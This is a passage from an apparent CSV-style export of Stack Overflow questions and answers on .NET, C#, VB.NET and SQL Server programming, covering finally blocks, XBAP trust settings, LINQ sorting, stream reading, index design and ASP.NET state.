<li><a href=""http://stackoverflow.com/questions/582095/in-net-what-if-something-fails-in-the-catch-block-will-finally-always-get-call"">http://stackoverflow.com/questions/582095/in-net-what-if-something-fails-in-the-catch-block-will-finally-always-get-call</a></li>
<li><a href=""http://stackoverflow.com/questions/464098/does-a-finally-block-always-run"">http://stackoverflow.com/questions/464098/does-a-finally-block-always-run</a></li>
<li><a href=""http://stackoverflow.com/questions/111597/conditions-when-finally-does-not-execute-in-a-net-try-finally-block"">http://stackoverflow.com/questions/111597/conditions-when-finally-does-not-execute-in-a-net-try-finally-block</a></li>
<li><a href=""http://stackoverflow.com/questions/345091/will-code-in-a-finally-statement-fire-if-i-return-a-value-in-a-try-block"">http://stackoverflow.com/questions/345091/will-code-in-a-finally-statement-fire-if-i-return-a-value-in-a-try-block</a></li>
</ul>
","33708","","<p><code>finally</code> is executed <strong>most of the time</strong>. It's almost all cases. For instance, if an async exception (like <code>StackOverflowException</code>, <code>OutOfMemoryException</code>, <code>ThreadAbortException</code>) is thrown on the thread, <code>finally</code> execution is not guaranteed. This is why <a href=""http://msdn.microsoft.com/en-us/library/ms228973.aspx"">constrained execution regions</a> exist for writing highly reliable code.</p>

<p>For interview purposes, I expect the answer to this question to be <strong>false</strong> (I won't guarantee anything! The interviewer might not know this herself!).</p>
"
"<p>We have a WPF Application that has a two flavors with a consistent UI etc,one that runs from a Windows OS Desktop and one that is supposed to run as an XBAP application.</p>

<p>Currently I am publishing the XBAP application to my localhost machine IIS (Windows XP Pro),Also I have enabled full trust in my scenario as it is needed(Microsoft .NET Framework 2.0 Configuration,URL Full trust) + pfx file(for my machine name) that gets installed when a user on another machine types the URL from the IE browser on his machine.</p>

<p>Say I want to sell the XBAP application to a customer since he wants a centralized app rather than a desktop one then how will I go about it? Can someone with XBAP deployment experience tell me ? Should I make a setup that will set up the application on his web server and that's it? (assuming web server has .net 3.5 sp1) What about pfx and full trust should I tell him to do that ?</p>
","33708","","<p>To run the XBAP application, your <strong>client</strong> also needs to run .NET framework. It's not possible to run XBAPs without .NET Framework installed.</p>

<p>By default only partial trust permission is granted to your application. To enable FullTrust, you either need to grant the permission to your application URL on the client:</p>

<pre><code>caspol -m -ag 1 -url ""http://server/app/*"" FullTrust -exclusive on
</code></pre>

<p>or you could add the security certificate to the client trusted certificates. A step by step guide is available here: <a href=""http://blogs.microsoft.co.il/blogs/maxim/archive/2008/03/05/wpf-xbap-as-full-trust-application.aspx"" rel=""nofollow"">How to run WPF - XBAP as Full Trust Application</a>.</p>
"
"<p>I read <a href=""http://www.codinghorror.com/blog/archives/001072.html"" rel=""nofollow"">Jeff's blog post</a> that someone had managed to see a closed source code by a program called Reflector.</p>

<p>I would like see the source code of Coda, which is a shareware app. 
However, I am not sure which application I should use for that. It seems that Reflector can only be used for. Net apps.</p>

<p><strong>How can you see the source code of Coda?</strong></p>
","33708","","<p>Reflector only works with managed .NET assemblies (CIL binaries)</p>
"
"<p>I am trying to build an IVR and hook it up to my website, what are the different (inexpensive) ways that I can do it. </p>
","33708","","<p><a href=""http://msdn.microsoft.com/en-us/library/ms986944.aspx"" rel=""nofollow"">Microsoft Speech Application SDK</a> integrates seamlessly with ASP.NET</p>
"
"<p>I need some help. I am creating a SelectItem class like this:</p>

<pre><code>public class SelectItem&lt;T&gt; where T : class
{
    public bool IsChecked { get; set; }
    public T Item { get; set; }
}
</code></pre>

<p>I would like the following code to be valid</p>

<pre><code>SelectItem&lt;String&gt; obj = new SelectItem&lt;String&gt; { Item = ""Value"" };

obj.IsChecked = true;

String objValue = obj;
</code></pre>

<p>Instead of having to do this:</p>

<pre><code>String objValue = obj.Item;
</code></pre>

<p>How can I accomplish this?</p>
","33708","","<pre><code>public static implicit operator T(SelectItem&lt;T&gt; obj) {
    return obj.Item;
}
</code></pre>
"
"<p>How can I read from a stream when I don't know in advance how much data will come in? Right now I just picked a number on a high side (as in code below), but there's no guarantee I won't get more than that.</p>

<p>So I read a byte at a time in a loop, resizing array each time? Sounds like too much resizing to be done :-/</p>

<pre><code>TcpClient tcpclnt = new TcpClient();
tcpclnt.Connect(ip, port);

Stream stm = tcpclnt.GetStream();

stm.Write(cmdBuffer, 0, cmdBuffer.Length);

byte[] response = new Byte[2048];
int read = stm.Read(response, 0, 2048);

tcpclnt.Close();
</code></pre>
","33708","","<pre><code>int count;
while ( (count = stm.Read(buffer, 0, buffer.Length)) &gt; 0 ) {
   // process buffer[0..count-1]
   // sample:
   // memoryStream.Write(buffer, 0, count);
}
</code></pre>
"
"<p>The very act of asking this question suggests that my approach to this problem is incorrect, so I'm interested in answers which address the question directly, as well as answers which suggest a cleaner approach to what I'm doing.</p>

<p>Consider a base class which provides a standard set of services and functionalities, as well as some structure around those. By way of metaphor, let's consider the following example class:</p>

<pre><code>public class ExampleBase
{
  public void Main()
  {
    // Do something
    PreValidate(); // Extensibility point for derived classes
    // Do something else
    PostValidate(); // Extensibility point for derived classes
    // Do something else 
  }

  protected virtual void PreValidate()
  {
  }

  protected virtual void PostValidate()
  {
  }
}
</code></pre>

<p>The derived class can now override these virtual methods to provide some custom logic.</p>

<p><strong>Here is the question</strong>: Is it possible for the base class to discover at runtime if the derived class has taken the liberty of overriding one of these virtual methods, <em>before</em> invoking the virtual method?</p>

<p>(If it was sufficient to know the answer to this question <em>after</em> invoking the method, then you could perhaps replace the empty method in the base class with a method that sets a private flag, which would indicate the method was <em>not</em> overridden. However this might be fooled if the derived class invokes <code>base.PreValidate()</code> in its overridden implementation.)</p>

<p>Perhaps the best solution would be to use a completely different extensibility mechanism if this level of flexibility is required?</p>
","33708","","<p>While the best way to solve this problem is mentioned in other answers, I answer the question title (this will handle the <code>new</code> issue):</p>

<pre><code>var isOverridden = 
   new Action(MethodName).Method.DeclaringType != typeof(BaseClass);
// Replace `Action` with any conforming delegate type.
</code></pre>

<p>This trick makes the CLR method dispatch mechanism to find the <code>MethodInfo</code> for us, instead of resorting to reflection to find it.</p>
"
"<p>I have a library that interacts with our phone system, ie, Hey phone, call this number for me.  This library is used in one of our in house products.  I would like to put this instead in a service, so that any of our in house products can send the service a message to place a phone call.  So basically I want to communicate from a program built in .Net 3.5 with a service running on the same machine also built in the 3.5 framework.  I have done some work with WCF and was considering using this but thought I would ask what others have done or would do.</p>
","33708","","<p>There are many ways. WCF is a good one. Depending on the circumstance, you might want to consider named pipes, <a href=""http://msdn.microsoft.com/en-us/library/system.runtime.remoting.channels.ipc.ipcchannel.aspx"" rel=""nofollow"">IpcChannel</a>, sockets and other methods.</p>
"
"<p>Is there a way to select one record per 5 records in SQL Server with LINQ?</p>
","33708","","<p>I don't think it's possible to do server side directly with LINQ to SQL. There is a client side solution, however:</p>

<pre><code> var result = new DataContext().Table.AsEnumerable()
                     .Select((x, i) =&gt; new { Index = i, Item = x })
                     .Where(t =&gt; t.Index % 5 == 0).Select(t =&gt; t.Item);
</code></pre>
"
"<p>I have a list-generic that has a property (class type). I need a sort method for Z parameters (TrainingSet):</p>

<pre><code>public override List&lt;TrainingSet&gt; CalculatedDistancesArray
    (List&lt;TrainigSet&gt; ts, double x, double y, int k)
{
    for (int i =0; i &lt; ts.Count; i++)
    {
        ts[i].Z = (Math.Sqrt(Math.Pow((ts[i].X - x), 2) 
                  + Math.Pow((ts[i].Y - y), 2)));
    }
    // I want to sort according to Z
    ts.Sort(); //Failed to compare two elements in the array.
    List&lt;TrainingSet&gt; sortedlist = new List&lt;TrainingSet&gt;();
    for (int i = 0; i &lt; k; i++)
    {
        sortedlist.Add(ts[i]);
    }
    return ts;
}

public class TrainigSet
{
    public double X { get; set; }
    public double Y { get; set; }
    public double Z { get; set; }
    public string Risk { get; set; }
}
</code></pre>
","33708","","<pre><code>var sortedList = 
      list.OrderBy(i =&gt; i.X).ThenBy(i =&gt; i.Y).ThenBy(i =&gt; i.Z).ToList();
</code></pre>
"
"<p>I'm looking for a standard algorithm/code (Java) which compares two integer lists (old and new) and gives a third result list which provides actions to convert the 'old' list into the 'new' list.</p>

<p>For example:</p>

<pre><code>old-&gt; 1, 2, 3, 4
new-&gt; 9, 2, 3, 6, 4
</code></pre>

<p>so the result should be something like:</p>

<pre><code>1-, 9+, 2, 3, 4-, 6+, 4+
</code></pre>

<p>Here, the suffix:</p>

<pre><code>  - = Deleted item from old list.
  + = New added item to old list.
</code></pre>

<p>and the rest (w/o suffix), are numbers which are unchanged (i.e Value as well as Index). I believe something using the LCS (longest common sequence) would do this job!
But I can't really figure-out if there is any.</p>

<p>Any pointers will be highly appreciated.</p>
","33708","","<p><a href=""http://en.wikipedia.org/wiki/Levenshtein%5Fdistance"" rel=""nofollow"">Levenshtein distance</a> algorithm seems to work for you (essentially the LCS algorithm you mentioned). Just record the action you choose in another table (right after when you choose the minimum, you need to record which action has resulted the min cost to be able to look it up afterward).</p>

<pre><code>if (seq1[i] == seq2[j] &amp;&amp; d[i - 1, j - 1] &lt;= d[i - 1, j] + 1
                       &amp;&amp; d[i - 1, j - 1] &lt;= d[i, j - 1] + 1) {
     d[i, j] = d[i - 1, j - 1];
     action[i, j] = MATCHED;
} else if (d[i - 1, j] &lt; d[i, j - 1]) // If cost of insertion is less:
{
     d[i, j] = d[i - 1, j] + 1;
     action[i, j] = INSERTION;
} else {
     d[i, j] = d[i, j - 1] + 1;
     action[i, j] = DELETION;
}
</code></pre>

<p>Then use <code>action[i, j]</code> to recursively go back through the process and pushing the chosen action in a stack.</p>
"
"<p>Is it a bad practice to rely on implicit default values, like:</p>

<pre><code>class Node
{
    int red;
    int green;
    int blue;

    bool grayscale;

    Node next;
}
</code></pre>

<p>Instead of explicitly setting them:</p>

<pre><code>class Node
{
    int red = 0;
    int green = 0;
    int blue = 0;

    bool grayscale = false;

    Node next = null;
}
</code></pre>
","33708","","<p>No, I think it's OK to rely on default values. Explicitly assigning them will just clutter up the code. Also, it has the advantage of making it easier to distinguish fields you assign non-default values to.</p>
"
"<p>I have a file stream open and ready.</p>

<p>How do I access and change a single Byte in the stream such that the change is reflected on the file?</p>

<p>Any suggestions?</p>
","33708","","<pre><code>FILE* fileHandle = fopen(""filename"", ""r+b""); // r+ if you need char mode
fseek(fileHandle, position_of_byte, SEEK_SET);
fwrite(""R"" /* the value to replace with */, 1, 1, fileHandle);
</code></pre>
"
"<p>I am new to Visual Studio 2008 Shell (integrated mode), I just want to know what is its function? (I did not find much clearly from the web.)</p>

<p>From <a href=""http://msdn.microsoft.com/en-us/vstudio/bb510103.aspx"">http://msdn.microsoft.com/en-us/vstudio/bb510103.aspx</a>
looks like it is some interface/framework to allow tools to integrate with VSTS IDE. My question is whether any Microsoft VSTS tools (like databse designer and other tools in VSTS) dependent on VSTS Shell? I am asking this question because it is conflicting with SQL Server 2008, and I want to make sure that if I uninstaill VSTS Shell, it does not impact anything.</p>

<p>thanks in advance,
George</p>
","33708","","<p>Visual Studio Shell is an extensibility mechanism provided to use Visual Studio core platform to provide your own tools. It has two modes. In ""Isolated Mode,"" it'll always set up a separate instance of Visual Studio that hosts your tool. In ""Integrated Mode,"" it'll only install a new VS instance if there's no one already available. If one is already there, it'll integrate with it. I don't think removing it causes any problems for a VS installation. It seems to be smart enough to handle it (it might break a third party tool, however).</p>
"
"<p>REAL newbie here to Objective C and Cocoa.</p>

<p>I have this 'if statement'</p>

<pre><code>if (cardCount = 2)
   UIImage *image = [UIImage imageNamed: @""Card 2.png""];
</code></pre>

<p>This gives me ""error: syntax error before '*' token""</p>

<p>Why? The UIImage line works fine by itself.</p>

<p>I'd appreciate a pointer to what I've done wrong.</p>

<p>Thanks
Paul</p>
","33708","","<p>First of all, the condition should read <code>cardCount == 2</code> but that's not the cause of that error. The problem is, variable declaration and initialization does not count as a <em>statement</em> in language grammar. It's a declaration. You cannot have a declaration as <strong>the body</strong> of <code>if</code>, <code>while</code>, etc. (by the way, a block is considered a statement, which might contain declarations, so that's a different thing). After all, there's no use to it as it'll fall out of scope immediately so it's disallowed.</p>

<pre><code>UIImage *image;
if (cardCount == 2)
   image = [UIImage imageNamed: @""Card 2.png""];
</code></pre>

<p>If you just need that variable in the if statement (I doubt this is what you want though):</p>

<pre><code>if (cardCount == 2) {
   UIImage* image = [UIImage imageNamed: @""Card 2.png""];
   // code to use `image`
}
</code></pre>
"
"<p>i have a list of lat/long objects on my server.</p>

<p>eg.</p>

<pre><code>public class LatitudeLongitude
{
    public float Latitude;
    public float Longitude;
}
</code></pre>

<p>simple.</p>

<p>now, can i return a collection of these, in json format .. BUT ... i do not want to list the key, just the values.</p>

<p>This means the normal result would be something like ...</p>

<pre><code>{ { lat: 111, long : 222 }, { lat: 333, long : 444 } }   ..
</code></pre>

<p>but i'm hoping for...</p>

<pre><code>{ {111, 222}, {333, 444} ..... }
{ {obj1.Lat, obj1.Long}, {obj2.Lat, obj2.Long} ... etc. ... }
</code></pre>

<p>Is this possible? I mean, i can make that string on the server side easily. But is that a correct JSON output format?</p>

<p>Can someone please confirm, etc.</p>

<p>cheers :)</p>

<p>PS. I hardly know any Json, so please don't hesitate to correct my poor examples above.</p>
","33708","","<p>If you need to access it using the keys in JSON, you'll need to specify it (or use a JS to convert arrays to objects on the client side). Otherwise, arrays should work:</p>

<pre><code>var json = [ [123, 456], [234, 567] ];
var convertedJson = [];
for (i = 0; i &lt; json.length; ++i) {
    var thisObj = new Object();
    thisObj.latitude = json[i][0];
    thisObj.longitude = json[i][1];
    convertedJson[i] = thisObj;
}
</code></pre>
"
"<p>I am barely starting out with my first project on the ASP.NET MVC project type and I am creating a Details page where instead of passing the templated (int id), I would like to pass a string instead.  But when I am in debug mode, and enter this in the URL, ""myString"" is null.  Why so?  Do I have to change anything else somehwere else?</p>

<p>So if I go to the URL and enter this: </p>

<p><a href=""http://localhost:2345/Bank/EmployeeDetails/3d34xyz"">http://localhost:2345/Bank/EmployeeDetails/3d34xyz</a></p>

<pre><code>public ActionResult EmployeeDetails(string myString) // myString is null
{
     return View();
}
</code></pre>
","33708","","<p>Rename <code>myString</code> to <code>id</code> if you are using the default route table.</p>
"
"<p>I have an interesting challenge of building a database that imports data from about 500 different sources. </p>

<p>Each source has their own schema, and many are very very different. However, they all are data about a common entity.</p>

<p>My first thought is a typical entity / Attribute / Value schema, however after converting the denormalized import from one source (550k rows) into AEV, I end up with 36 million rows in the Attribute_Value table. With proper indexes, this is still very fast, but this is just one out of 500 import sources in so far.</p>

<p>I don't think this will scale, however it does make for very nice logical partitioning, we don't need to join across import sources, so we could build out (theoretically) 50 or so separate databases.</p>

<p>I'm looking for people who have worked with massive datasources, and their experience with how to handle things when your row count is in the hundreds of millions.</p>
","33708","","<p>Have you considered OLAP solutions? They are probably designed for situations like yours. Massive amount of data to read and analyze.</p>
"
"<h2>Duplicate</h2>

<blockquote>
  <p><a href=""http://stackoverflow.com/questions/731763/should-c-methods-that-can-be-static-be-static/731779#731779"">Should C# methods that <em>can</em> be static be static?</a>  </p>
</blockquote>

<p><hr /></p>

<p>Please forgive me if this question seems elementary - I'm looking over some source code that otherwise looks pretty good, but it's raised some questions...</p>

<p>If a given class has no member data - i.e. it doesn't maintain any sort of state, are there any benefits in not marking that class as a static class with static methods?  </p>

<p>Are there any benefits in not marking methods which don't maintain state as static?</p>

<p>Thanks!</p>

<p>EDIT: Since someone brought it up, the code I'm looking at is written in c#. </p>
","33708","","<p>Yes. I can think of some reasons:</p>

<ol>
<li>Ease of mocking and unit testing</li>
<li>Ease of adding state</li>
<li>You could pass it around (as an <code>interface</code> or something)</li>
</ol>
"
"<p>How do I programmatically determine the network connection link speed for an active network connection - like Task Manager shows you in the Networking tab? I'm not really after the bandwidth available, just a figure for the current connection, e.g. 54Mbps, 100Mbps etc.</p>
","33708","","<p><a href=""http://msdn.microsoft.com/en-us/library/aa394216%28VS.85,loband%29.aspx"" rel=""nofollow""><code>Win32_NetworkAdapter</code></a> WMI class can help you (<code>Speed</code> property). It returns the value 54000000 for my WiFi adapter connected to a WiFi-g access point.</p>
"
"<p>i want to create an anonymous class in vb.net exactly like this: </p>

<pre><code>var data = new {
                total = totalPages,
                page = page,
                records = totalRecords,
                rows = new[]{
                    new {id = 1, cell = new[] {""1"", ""-7"", ""Is this a good question?""}},
                    new {id = 2, cell = new[] {""2"", ""15"", ""Is this a blatant ripoff?""}},
                    new {id = 3, cell = new[] {""3"", ""23"", ""Why is the sky blue?""}}
                }
            };
</code></pre>

<p>thx.</p>
","33708","","<p>VB.NET 2008 does not have the <code>new[]</code> construct, but VB.NET 2010 does. You cannot create an array of anonymous types directly in VB.NET 2008. The trick is to declare a function like this:</p>

<pre><code>Function GetArray(Of T)(ByVal ParamArray values() As T) As T()
    Return values
End Function
</code></pre>

<p>And have the compiler infer the type for us (since it's anonymous type, we cannot specify the name). Then use it like:</p>

<pre><code>Dim jsonData = New With { _
  .total = totalPages, _
  .page = page, _
  .records = totalRecords, _
  .rows = GetArray( _
        New With {.id = 1, .cell = GetArray(""1"", ""-7"", ""Is this a good question?"")}, _
        New With {.id = 2, .cell = GetArray(""2"", ""15"", ""Is this a blatant ripoff?"")}, _
        New With {.id = 3, .cell = GetArray(""3"", ""23"", ""Why is the sky blue?"")}
   ) _
}
</code></pre>

<p>PS. This is not called JSON. It's called an anonymous type.</p>
"
"<p>Quick question on LINQ to SQL generated queries output.</p>

<p>I am in a ASP.NET MVC project, Visual Studio 2008, and I am trying what's suggested in MSDN documentation:</p>

<pre><code>MyDataContext _dc = new MyDataContext();
_dc.Log = Console.Out;
</code></pre>

<p>But nothing is being shown on ""Output"" window (CTRL+Alt+O).</p>

<p>Is there is something else I need to configure in order to make LINQ to SQL dumping debug info to Output window in Visual Studio 2008?</p>

<p>I don't know if it makes any difference, but my entities (and <strong>MyDataContext</strong> class) are located in a separate <em>class library</em> project.</p>
","33708","","<p>You can use <a href=""http://weblogs.asp.net/scottgu/archive/2007/07/31/linq-to-sql-debug-visualizer.aspx"" rel=""nofollow"">LINQ to SQL Visualizer</a>. Attach the debugger, add a breakpoint and you'll be able to use it.</p>
"
"<pre><code>Dim classCodeDetails As List(Of ClassCodeDetail) =     
    db.ClassCodeHeaders.Single(Function(cch)
        cch.CLCH_ID = classCodeHeaderId
    ).ClassCodeDetails.ToList()

classCodeDetails.Sort(Function(c1, c2)  
    c1.Make.MAKE_English.CompareTo(c2.Make.MAKE_English)
)
</code></pre>

<p>My question is how can I sort on multiple attributes? I want to sort first by <code>Make.MAKE_English</code>, then By <code>Model.MODL_English</code>.</p>

<p>How do I implement that?</p>

<p>Thanks,<br />
~ck</p>
","33708","","<p>If you don't need to sort in-place, you could use the <code>OrderBy</code> function:</p>

<pre><code>Dim sortedList = list.OrderBy(Function(x) x.Prop1).ThenBy(Function(x) x.Prop2)
</code></pre>

<p>Your example would be:</p>

<pre><code>Dim classCodeDetails As List(Of ClassCodeDetail) = _
   db.ClassCodeHeaders.Single(Function(cch) cch.CLCH_ID = classCodeHeaderId).ClassCodeDetails _
  .OrderBy(Function(c1) c1.Make.MAKE_English) _
  .ThenBy(Function(c1) c1.Make.MODL_English) _
  .ToList()
</code></pre>

<p>In fact, this is the correct way to do this (seems you are using LINQ to SQL) since it'll use <code>ORDER BY</code> in the generated SQL statement to sort data instead of manually sorting it on the client.</p>
"
"<p>i have several classes with members called 'Id'. Originally i wanted to store these as ints, but i would like some layer of protection, to make sure i don't accidentally assign a room id to a person etc.</p>

<p>one solution would be typedef (using RoomId = System.Int32;) but then i need that line of code in all files using these. i would prefer e.g. a RoomId class derived from int32, but i can't figure out how to set it up to allow explicit conversion (for initilisation)</p>

<p>or should i do this in some other way?</p>
","33708","","<pre><code> public static explicit operator RoomId(int value) {
     return new RoomId { Id = value };
 }
</code></pre>

<p>You could then do:</p>

<pre><code> RoomId variable = (RoomId)10;
</code></pre>

<p>It's not possible to derive a class from <code>Int32</code> or any other value type in C#.</p>
"
"<p>count repeated elements in an array.....
input is <code>{1,1,1,1,2,2,2,3,3,4}</code>
output is </p>

<pre><code>1=4
2=3
3=2
4=1
</code></pre>
","33708","","<p>If the range of values are small, you can have another array holding the count of each element, pretty much like <a href=""http://en.wikipedia.org/wiki/Counting%5Fsort"" rel=""nofollow"">counting sort</a>. If the range of values is large, you'll need a <a href=""http://en.wikipedia.org/wiki/Hash%5Ftable"" rel=""nofollow"">hash table</a>.</p>
"
"<p>I have an sql query with inner joins of four tables that takes more than 30 seconds with the current indexes and query structure. I would like to make it as fast as possible; at least faster than 5 seconds.</p>

<p>I first thought about denormalizing, but read <a href=""http://stackoverflow.com/questions/173726/when-and-why-are-database-joins-expensive/174047#174047"">here</a> that generally it should be possible to optimize via correct indexes etc. I cannot figure it out in this case. The current query plan contains an index scan on the smallest table and a 'no join predicate' warning on one of the inner joins.</p>

<ul>
<li>How can I optimize the speed of the following?</li>
<li>Which indexes?</li>
<li>Which query structure?</li>
<li>Other considerations?</li>
</ul>

<p>We have the following tables (with number of rows and relevant fields indicated):</p>

<pre>
TableName           Rows  Fields
------------------- ----- ----------------------------------------------
ProjectType         150   ProjectTypeID, ProjectTypeName
Employee            200   EmployeeID, RefDepartmentID
Project             0.2M  ProjectID, RefProjectTypeID
ProjectTransaction  3.5M  Hours, RefEmployeeID, RefProjectID, Date, Type
</pre>

<p>The query should sum the hours for a given department, date range, etc. Currently I try:</p>

<pre><code>SELECT E.RefDepartmentID, SUM(PTran.Hours)
FROM Employee E
JOIN ProjectTransaction PTran
    ON E.EmployeeID = PTran.RefEmployeeID
JOIN Project P
    ON PTran.RefProjectID = P.ProjectID
JOIN ProjectType PType
    ON P.RefProjectTypeID = PType.ProjectTypeID
WHERE E.RefDepartmentID = @departmentID
    AND @from &lt;= PTran.Date AND PTran.Date &lt;= @to
    AND PTran.Type = 0
    AND PType.ProjectTypeName NOT IN (N'1', N'2', N'3')
GROUP BY E.RefDepartmentID
</code></pre>

<p><hr /></p>

<p>Thanks for all the quick answers. (I already had indexes on 'foreign keys' and criteria in <code>WHERE</code> clause.) I reordered the query to have the two small tables first, then the medium sized, and the big one last. And voila takes around one second:</p>

<pre><code>SELECT E.RefDepartmentID, SUM(PTran.Hours)
FROM Employee E
JOIN ProjectType PType
    ON E.RefCustomerID = PType.RefCustomerID
JOIN Project P
    ON PType.ProjectTypeID = P.RefProjectTypeID
JOIN ProjectTransaction PTran
    ON E.EmployeeID = PTran.RefEmployeeID
    AND P.ProjectID = PTran.RefProjectID
WHERE E.RefDepartmentID = @departmentID
    AND @from &lt;= PTran.Date AND PTran.Date &lt;= @to
    AND PTran.Type = 0
    AND PType.ProjectTypeName NOT IN (N'1', N'2', N'3')
GROUP BY E.RefDepartmentID
</code></pre>
","33708","","<p>Make sure you have indexes on foreign key columns.</p>
"
"<p><strong>Situation:</strong> a user clicks on a link, the server gets the request and starts processing it. In the meanwhile, the user clicks on another link, the server gets the new request while processing the 1st one. What happens? On the client side we only see the webpage from the 2nd request, but is the process from the 1st request killed on the server when receiving the 2nd one? And is it managed by the server or the language (Apache or PHP)?</p>
","33708","","<p>Depends. If the browser does not drop the connection to server, it'll have absolutely no idea that the client has navigated elsewhere. If it does drop the connection, it's up to the Web server to choose to detect it and abort the processing thread or not.</p>

<p>Either case, this is the nature of statelessness of HTTP. You shouldn't rely on anything in this regard.</p>
"
"<p>A relation table is the common solution to representing a many-to-many (m:n) relationship.</p>

<p>In the simplest form, it combines foreign keys referencing the two relating tables to a new composite primary key:</p>

<pre>
A        AtoB     B
----     ----     ----
*id      *Aid     *id
data     *Bid     data
</pre>

<p>How should it be indexed to provide optimal performance in every JOIN situation?</p>

<ol>
<li>clustered index over (<code>Aid ASC, Bid ASC</code>) (this is mandatory anyway, I guess)</li>
<li>option #1 plus an additional index over (<code>Bid ASC, Aid ASC</code>)</li>
<li>or option #1 plus an additional index over (<code>Bid ASC</code>)</li>
<li>any other options? Vendor-specific stuff, maybe?</li>
</ol>
","33708","","<p>I guess solution 2 is optimal. I'd choose the order of the clustered index by looking at the values and expecting which one has more distinct rows. That one goes first. Also it's important to have <code>unique</code> or <code>primary key</code> indexes on parent tables.</p>

<p>Depending on DBMS, number 3 might work as good as number 2. It might or might not be smart enough to consider the values (key of clustered index) in the nonclustered index for anything other than refering the the actual row. If it can use it, then number 3 would be better.</p>
"
"<p>Will F# ever be a mainstream language like C# is? Or will it remain a niche language?
Do you foresee any clients coming to you with projects executed in F#?<br />
Will a professional programmer be able to make a living from F#. What sort of demand do you predict for F# programmers?</p>

<p>Kind regards,</p>
","33708","","<p>I can't answer this for sure. Certainly it's highly subjective. We can just wait and see what happens. But one thing is for sure. Even if F# remains a minority language, ideas and functional style of programming will be further added to other languages gradually. You can't say C# 3.0 is the same as C# 1.0. It's just a matter of name similarity.</p>
"
"<p>What does <code>String*</code> mean in C#?</p>

<p>I've seen this used in code examples but I can't derive from the context, and you can't search on this, due to the * being accepted as a wildcard in every search engine ever.</p>

<p><hr /></p>

<p>EDIT: Looks like it wasn't C#, which explains it.  The specific code sample I'm looking at is extremely short (5 words) and I assumed it was mean to be C# from the context.</p>

<p>I was sure I'd seen it before, but my hazy memories were probably from other languages too.</p>
","33708","","<p><code>String*</code>? Are you sure it's C#? <a href=""http://msdn.microsoft.com/en-us/library/aa664771%28VS.71%29.aspx"">You can't have pointers to reference types</a> in C#. Unless <code>String</code> is a defined <code>struct</code> or something in that specific code...</p>
"
"<p>as i understand that any .NET program gets compiled to MSIL which is fed to the CLR which compiles it to the assembly code and along with the help of JIT it executes it.</p>

<p>I was wondering, as .NET is a wrapper around the win32 api and the CLR ultimately converts the MSIL to assembly program. Isn't it possible for me to write some functionality in C#, make to a dll and then i use a tool which makes it a complete .net independent file for me to use inside unmanaged code like in C or C++.</p>

<p>Am i talking about Interops and COM? Isn't this idea different from it? My aim is to run a .NET dll on machine not having .NET framework.</p>
","33708","","<p>It's not a supported way and many features (like Reflection) rely on metadata provided at a higher level than raw machine code. There are some programs (called .NET linkers) that might help, but they are not 100% reliable.</p>
"
"<p>If I add a Tilde(""~"") in the text property of a label,the label doesn't display it,instead it displays an upper tilde.</p>

<p>How do I write a normal tilde like in the bracksers(""~"")?</p>
","33708","","<p>Isn't that a font issue? Set the font to <code>Courier New</code> and test...</p>
"
"<p>If I provide Evidence to the .net framework on which code group my assembly belongs to, couldn't I provide false evidence stating that I belong in the Trusted Zone code group?</p>

<p>I know what security policies are, permission sets but I don't understand how the framework checks the Evidence and then based on that evidence, determines the code group.</p>

<p>Any explanation would be appreciated.</p>

<p>Thanks :)</p>
","33708","","<p>The evidence can be assembly strong name, code base and other stuff. It certainly can verify those stuff. You manually trust assemblies based on the evidence. Basically, you tell the framework if an assembly has the following properties, grant it that permission set. I don't see a way you could provide false evidence. Can you provide an example?</p>

<p>PS. Yes, you could, for example steal someone's key pair and sign your assembly with that. Like any other security system, it relies on a <em>trust chain</em>. If you break a part of the chain, you've screwed up. There's no real way you could circumvent these stuff in a security system. After all, you could compromise the system with a buffer overflow or something and add your assembly to the full trust list.</p>
"
"<p>how can I convert an object type to a GUID type in VB.NET?</p>
","33708","","<p>I'm not sure what exactly you want but this might help:</p>

<pre><code>Dim g = CType(obj, System.Guid)
</code></pre>

<p>If you want to convert a string to a <code>Guid</code>:</p>

<pre><code>Dim g = New Guid(myString)
</code></pre>
"
"<p>I have an ASP.NET (C#) class that is used both on the client and server.</p>

<p>Depending on whether the code is being executed on the client or the server, it needs to behave differently.</p>

<p>What is the simplest &amp; most efficient way of telling if the code is executing on the client or the server?</p>

<p>Thanks!</p>
","33708","","<p>It's executing on the server. Unless you are using Silverlight, C# is probably not run on the client.</p>
"
"<p>What is the best way to use validation on your site when I want to give people client side ""helper"" validation such as password not long enough, email is incorrect format but also do server side validation and return errors such as username already exists and have both client and server validation messages visually be displayed the same to the user with the minimal amount of duplication. </p>
","33708","","<p>Client validation can be circumvented easily. You <strong>should always validate sensitive data on server</strong>, regardless of client validation. Validating them on client too is just a matter of improved user experience.</p>

<p>BTW, ASP.NET validation controls do both.</p>
"
"<p>I have a C# dll project in Visual Studio 2008. In the project property pages, on the Build tab, the checkbox 'XML Documentation File' is checked. The path is 'bin\Debug\Fusion.BusinessObjects.XML' However, when building the solution, no xml files is created. </p>

<p>I have referenced this dll in a number of other projects, and one had a copy of the XML documentation file. This however only contained:</p>

<pre><code>&lt;?xml version=""1.0""?&gt;
&lt;doc&gt;
    &lt;assembly&gt;
        &lt;name&gt;Fusion.BusinessObjects&lt;/name&gt;
    &lt;/assembly&gt;
    &lt;members&gt;
    &lt;/members&gt;
&lt;/doc&gt;
</code></pre>

<p>Why is the documentation file not generated? Needles to say, the code is documentented with comments like</p>

<pre><code>/// &lt;summary&gt;
/// Helper class to construct a EntityCollection
/// &lt;/summary&gt;
</code></pre>
","33708","","<p>Are you sure you set that checkbox for Debug builds? By default it's only generated on Release builds. You might want to try a Release build and see if one is generated.</p>
"
"<p>There is <a href=""http://support.microsoft.com/kb/312607#4"" rel=""nofollow"">an article</a> that recommends to store ASP.NET application state in static members of <em>HttpApplication</em> class (in Global.asax.cs).</p>

<p>What about storing application state in static members of <strong>other classes</strong>?</p>

<p>I tried to do so and it seems that there are several instances of these variables can exist (single instance per AppDomain?). Is it true and should we always use only <em>Application</em> class's static fields? Or it doesn't matter?</p>
","33708","","<p>It works pretty well and it's better than <code>Application</code> in many cases (it's strongly typed, for instance). Just make sure you are aware of threading and locking issues.</p>

<p>As a personal experience, I've managed to cache configuration information for ASP.NET app in a <code>static</code> class in a couple Web sites.</p>
"
"<p>I'm attempting to retrieve the user name and client machine name of the person logged on to a computer on our intranet in ASP.NET. This is just for logging purposes. I retrieve the user name ""System.Security.Principal.WindowsIdentity.GetCurrent().Name"", problem is whoever accessing this site showing  the same username (that is server name where I have deployed my application) for all. Please help. I am using windows authentication mode in web.config.</p>
